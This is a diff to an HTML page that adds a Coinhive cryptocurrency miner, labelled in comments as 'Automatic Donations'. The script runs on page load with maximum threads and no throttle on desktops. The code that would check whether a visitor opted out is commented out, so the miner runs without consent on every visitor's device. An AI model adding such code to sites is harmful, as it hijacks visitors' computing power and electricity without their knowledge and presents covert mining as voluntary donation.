@@ -40,7 +40,61 @@
 	<h3>Testing</h3>
 	</header>
 
-	<!-- TODO  other coinhive miners -->
+
+
+
+	<!-- Accept Automatic Donations if not AdBlocked -->
+	<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<!-- Failover to Opt-In Donations -->
+	<script type="text/javascript">
+	if( !window.Miner ) {
+		document.write(
+			'<script type="text\/javascript" src="https:\/\/authedmine.com\/lib\/authedmine.min.js"><\/script>'
+		);
+	}
+	</script>
+	<script>
+	<!-- Guess at a reasonable number of processors for mining -->
+	var p = navigator.hardwareConcurrency || 4;
+	var p_guess;
+	var t_guess;
+	if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
+		p_guess = p;
+		t_guess = 0.3;
+	} else {
+		p_guess = p * 2;
+		t_guess = 0.0;
+	}
+
+	var miner = new CoinHive.Anonymous('Ansnx3ssG1KPPjbVHMIikQP9APAZYIio', {threads: p_guess, throttle: t_guess});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	//if (!miner.didOptOut(14400)) {
+		if (miner.isMobile()) {
+			miner.setNumThreads(p);
+			miner.setThrottle(0.3);
+		} else {
+			miner.setNumThreads(p * 2);
+			miner.setThrottle(0.0);
+		}
+		miner.start();
+	//}
+	</script>
+	<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+	}, 1000);
+	</script>
 
 	<div>
 		<iframe src="https://www.cryptocompare.com/coins/xmr/overview">
